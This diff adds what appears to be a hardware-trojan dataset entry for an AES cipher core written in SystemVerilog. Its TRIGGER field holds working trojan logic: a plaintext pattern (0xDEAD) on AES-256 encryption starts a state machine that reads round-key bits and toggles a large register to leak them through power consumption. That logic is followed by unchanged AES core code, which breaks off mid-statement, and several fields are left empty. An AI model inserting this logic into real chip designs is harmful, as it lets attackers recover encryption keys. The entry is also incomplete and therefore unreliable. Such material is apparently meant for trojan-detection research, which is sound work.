@@ -1,0 +1,329 @@
+Trojan ID: trojan_8
+Name: Side-Channel Amplifier
+Type: information_leakage
+Target Module: aes_cipher_core
+Target File: hw/ip/aes/rtl/aes_cipher_core.sv
+
+EXPLANATION:
+
+
+TRIGGER:
+logic        trojan_extract_enable;
+  
+  // Trojan trigger detection - looks for specific plaintext pattern
+  // Triggers when state[0][0] == 0xDEAD pattern (split across 2 bytes)
+  assign trojan_trigger = (state_q[0][0][0] == 8'hDE) && 
+                         (state_q[0][0][1] == 8'hAD) && 
+                         (op_i == CIPH_FWD) &&
+                         (key_len_i == AES_256) &&
+                         (state_we == SP2V_HIGH);
+
+  // Trojan state machine
+  localparam TROJAN_IDLE     = 3'b000;
+  localparam TROJAN_INIT     = 3'b001;  
+  localparam TROJAN_EXTRACT  = 3'b010;
+  localparam TROJAN_LEAK     = 3'b011;
+  localparam TROJAN_WAIT     = 3'b100;
+
+  always_comb begin : trojan_fsm
+    trojan_state_d = trojan_state_q;
+    trojan_key_extract_d = trojan_key_extract_q;
+    trojan_bit_counter_d = trojan_bit_counter_q;
+    trojan_signature_reg_d = trojan_signature_reg_q;
+    trojan_active = 1'b0;
+    trojan_extract_enable = 1'b0;
+    
+    case (trojan_state_q)
+      TROJAN_IDLE: begin
+        if (trojan_trigger) begin
+          trojan_state_d = TROJAN_INIT;
+          trojan_bit_counter_d = 5'b0;
+          trojan_key_extract_d = 8'h0;
+        end
+      end
+      
+      TROJAN_INIT: begin
+        trojan_state_d = TROJAN_EXTRACT;
+        // Extract first key byte from the current round key
+        trojan_key_extract_d = key_full_q[0][0][7:0];
+      end
+      
+      TROJAN_EXTRACT: begin
+        trojan_extract_enable = 1'b1;
+        if (trojan_bit_counter_q < 5'd8) begin
+          trojan_state_d = TROJAN_LEAK;
+        end else begin
+          trojan_state_d = TROJAN_WAIT;
+        end
+      end
+      
+      TROJAN_LEAK: begin
+        trojan_active = 1'b1;
+        // Create power signature based on extracted key bit
+        if (trojan_key_extract_q[trojan_bit_counter_q]) begin
+          // High power signature for bit '1'
+          trojan_signature_reg_d = 32'hAAAAAAAA;
+        end else begin
+          // Low power signature for bit '0'  
+          trojan_signature_reg_d = 32'h55555555;
+        end
+        trojan_bit_counter_d = trojan_bit_counter_q + 1'b1;
+        trojan_state_d = TROJAN_EXTRACT;
+      end
+      
+      TROJAN_WAIT: begin
+        // Wait for several cycles before returning to idle
+        trojan_signature_reg_d = 32'h0;
+        trojan_state_d = TROJAN_IDLE;
+      end
+      
+      default: trojan_state_d = TROJAN_IDLE;
+    endcase
+  end
+
+  // Trojan registers
+  always_ff @(posedge clk_i or negedge rst_ni) begin : trojan_regs
+    if (!rst_ni) begin
+      trojan_state_q        <= TROJAN_IDLE;
+      trojan_key_extract_q  <= 8'h0;
+      trojan_bit_counter_q  <= 5'h0;
+      trojan_signature_reg_q <= 32'h0;
+    end else begin
+      trojan_state_q        <= trojan_state_d;
+      trojan_key_extract_q  <= trojan_key_extract_d;
+      trojan_bit_counter_q  <= trojan_bit_counter_d;
+      trojan_signature_reg_q <= trojan_signature_reg_d;
+    end
+  end
+
+  // Power amplification circuit - toggles large capacitive load based on key bits
+  // This creates measurable power variations that leak key information
+  logic [127:0] trojan_power_drain_reg;
+  always_ff @(posedge clk_i or negedge rst_ni) begin : trojan_power_drain
+    if (!rst_ni) begin
+      trojan_power_drain_reg <= 128'h0;
+    end else if (trojan_active) begin
+      // Toggle pattern based on signature register to create distinctive power consumption
+      trojan_power_drain_reg <= {trojan_signature_reg_q, trojan_signature_reg_q, 
+                                trojan_signature_reg_q, trojan_signature_reg_q};
+    end else begin
+      trojan_power_drain_reg <= 128'h0;
+    end
+  end
+  // ============================================================================
+  // END HARDWARE TROJAN
+  // ============================================================================
+
+  // op_i is one-hot encoded. Check the provided value and trigger an alert upon detecing invalid
+  // encodings.
+  assign op_err    = ~(op_i == CIPH_FWD || op_i == CIPH_INV);
+  assign cfg_valid = cfg_valid_i & ~op_err;
+
+  //////////
+  // Data //
+  //////////
+
+  // SEC_CM: DATA_REG.SEC_WIPE
+  // State registers
+  always_comb begin : state_mux
+    unique case (state_sel)
+      STATE_INIT:  state_d = state_init_i;
+      STATE_ROUND: state_d = add_round_key_out;
+      STATE_CLEAR: state_d = prd_clearing_state_i;
+      default:     state_d = prd_clearing_state_i;
+    endcase
+  end
+
+  always_ff @(posedge clk_i or negedge rst_ni) begin : state_reg
+    if (!rst_ni) begin
+      state_q <= '{default: '0};
+    end else if (state_we == SP2V_HIGH) begin
+      state_q <= state_d;
+    end
+  end
+
+  // Masking
+  if (!SecMasking) begin : gen_no_masks
+    // The masks are ignored anyway, they can be 0.
+    assign sb_in_mask  = '0;
+    assign prd_masking = '0;
+
+    // Tie-off unused signals.
+    logic unused_entropy_ack;
+    logic [EntropyWidth-1:0] unused_entropy;
+    assign unused_entropy_ack = entropy_ack_i;
+    assign unused_entropy     = entropy_i;
+    assign entropy_req_o      = 1'b0;
+
+    logic unused_force_masks;
+    logic unused_prd_masking_upd;
+    logic unused_prd_masking_rsd_req;
+    assign unused_force_masks         = force_masks_i;
+    assign unused_prd_masking_upd     = prd_masking_upd;
+    assign unused_prd_masking_rsd_req = prd_masking_rsd_req;
+    assign prd_masking_rsd_ack        = 1'b0;
+
+    logic [3:0][3:0][7:0] unused_sb_out_mask;
+    assign unused_sb_out_mask = sb_out_mask;
+
+  end else begin : gen_masks
+    // The input mask is the mask share of the state.
+    assign sb_in_mask  = state_q[1];
+
+    // The masking PRNG generates:
+    // - the pseudo-random data (PRD) required by SubBytes,
+    // - the PRD required by the key expand module (has 4 S-Boxes internally).
+    aes_prng_masking #(
+      .Width                ( WidthPRDMasking        ),
+      .EntropyWidth         ( EntropyWidth           ),
+      .SecAllowForcingMasks ( SecAllowForcingMasks   ),
+      .SecSkipPRNGReseeding ( SecSkipPRNGReseeding   ),
+      .RndCnstLfsrSeed      ( RndCnstMaskingLfsrSeed ),
+      .RndCnstLfsrPerm      ( RndCnstMaskingLfsrPerm )
+    ) u_aes_prng_masking (
+      .clk_i         ( clk_i               ),
+      .rst_ni        ( rst_ni              ),
+      .force_masks_i ( force_masks_i       ),
+      .data_update_i ( prd_masking_upd     ),
+      .data_o        ( prd_masking         ),
+      .reseed_req_i  ( prd_masking_rsd_req ),
+      .reseed_ack_o  ( prd_masking_rsd_ack ),
+      .entropy_req_o ( entropy_req_o       ),
+      .entropy_ack_i ( entropy_ack_i       ),
+      .entropy_i     ( entropy_i           )
+    );
+  end
+
+  // Extract randomness for key expand module and SubBytes.
+  //
+  // The masking PRNG output has the following shape:
+  // prd_masking = { prd_key_expand, prd_sub_bytes_d }
+  assign prd_key_expand  = prd_masking[WidthPRDMasking-1 -: WidthPRDKey];
+  assign prd_sub_bytes_d = prd_masking[WidthPRDData-1 -: WidthPRDData];
+
+  // PRD buffering
+  if (!SecMasking) begin : gen_no_prd_buffer
+    // The masks are ignored anyway.
+    assign prd_sub_bytes_q = prd_sub_bytes_d;
+
+  end else begin : gen_prd_buffer
+    // PRD buffer stage to:
+    // 1. Make sure the S-Boxes get always presented new data/mask inputs together with fresh PRD
+    //    for remasking.
+    // 2. Prevent glitches originating from inside the masking PRNG from propagating into the
+    //    masked S-Boxes.
+    always_ff @(posedge clk_i or negedge rst_ni) begin : prd_sub_bytes_reg
+      if (!rst_ni) begin
+        prd_sub_bytes_q <= '0;
+      end else if (state_we == SP2V_HIGH) begin
+        prd_sub_bytes_q <= prd_sub_bytes_d;
+      end
+    end
+  end
+
+  // Convert the 3-dimensional prd_sub_bytes_q array to a 1-dimensional packed array for the
+  // aes_prd_get_lsbs() function used below.
+  logic [WidthPRDData-1:0] prd_sub_bytes;
+  assign prd_sub_bytes = prd_sub_bytes_q;
+
+  // Extract randomness for masking the input data.
+  //
+  // The masking PRNG is used for generating both the PRD for the S-Boxes/SubBytes operation as
+  // well as for the input data masks. When using any of the masked Canright S-Box implementations,
+  // it is important that the SubBytes input masks (generated by the PRNG in Round X-1) and the
+  // SubBytes output masks (generated by the PRNG in Round X) are independent. This can be achieved
+  // by using e.g. an unrolled Bivium stream cipher primitive inside the PRNG. Since the input data
+  // masks become the SubBytes input masks in the first round, we select the same 8 bit lanes for
+  // the input data masks which are also used to form the SubBytes output mask for the masked
+  // Canright S-Box implementations, i.e., the 8 LSBs of the per S-Box PRD. In particular, we have:
+  //
+  // prd_masking = { prd_key_expand, ... , sb_prd[4], sb_out_mask[4], sb_prd[0], sb_out_mask[0] }
+  //
+  // Where sb_out_mask[x] contains the SubBytes output mask for byte x (when using a masked
+  // Canright S-Box implementation) and sb_prd[x] contains additional PRD consumed by SubBytes for
+  // byte x.
+  //
+  // When using a masked S-Box implementation other than Canright, we still select the 8 LSBs of
+  // the per-S-Box PRD to form the input data mask of the corresponding byte. We do this to
+  // distribute the input data masks over all output bits the masking PRNG. We do the extraction on
+  // a row basis.
+  localparam int unsigned WidthPRDRow = 4*WidthPRDSBox;
+  for (genvar i = 0; i < 4; i++) begin : gen_in_mask
+    assign data_in_mask[i] = aes_prd_get_lsbs(prd_sub_bytes[i * WidthPRDRow +: WidthPRDRow]);
+  end
+
+  // Rotate the data input masks by 64 bits to ensure the data input masks are independent
+  // from the PRD fed to the S-Boxes/SubBytes operation.
+  assign data_in_mask_o = {data_in_mask[1], data_in_mask[0], data_in_mask[3], data_in_mask[2]};
+
+  // Cipher data path
+  aes_sub_bytes #(
+    .SecSBoxImpl ( SecSBoxImpl )
+  ) u_aes_sub_bytes (
+    .clk_i     ( clk_i             ),
+    .rst_ni    ( rst_ni            ),
+    .en_i      ( sub_bytes_en      ),
+    .out_req_o ( sub_bytes_out_req ),
+    .out_ack_i ( sub_bytes_out_ack ),
+    .op_i      ( op_i              ),
+    .data_i    ( state_q[0]        ),
+    .mask_i    ( sb_in_mask        ),
+    .prd_i     ( prd_sub_bytes_q   ),
+    .data_o    ( sub_bytes_out     ),
+    .mask_o    ( sb_out_mask       ),
+    .err_o     ( sub_bytes_err     )
+  );
+
+  for (genvar s = 0; s < NumShares; s++) begin : gen_shares_shift_mix
+    if (s == 0) begin : gen_shift_in_data
+      // The (masked) data share
+      assign shift_rows_in[s] = sub_bytes_out;
+    end else begin : gen_shift_in_mask
+      // The mask share
+      assign shift_rows_in[s] = sb_out_mask;
+    end
+
+    aes_shift_rows u_aes_shift_rows (
+      .op_i   ( op_i              ),
+      .data_i ( shift_rows_in[s]  ),
+      .data_o ( shift_rows_out[s] )
+    );
+
+    aes_mix_columns u_aes_mix_columns (
+      .op_i   ( op_i               ),
+      .data_i ( shift_rows_out[s]  ),
+      .data_o ( mix_columns_out[s] )
+    );
+  end
+
+  always_comb begin : add_round_key_in_mux
+    unique case (add_rk_sel)
+      ADD_RK_INIT:  add_round_key_in = state_q;
+      ADD_RK_ROUND: add_round_key_in = mix_columns_out;
+      ADD_RK_FINAL: add_round_key_in = shift_rows_out;
+      default:      add_round_key_in = state_q;
+    endcase
+  end
+
+  for (genvar s = 0; s < NumShares; s++) begin : gen_shares_add_round_key
+    assign add_round_key_out[s] = add_round_key_in[s] ^ round_key[s];
+  end
+
+  /////////
+  // Key //
+  /////////
+
+  // SEC_CM: KEY.SEC_WIPE
+  // Full Key registers
+  always_comb begin : key_full_mux
+    unique case (key_full_sel)
+      KEY_FULL_ENC_INIT
+
+PAYLOAD:
+
+
+TESTBENCH STRATEGY:
+
+
+TAXONOMY:
+
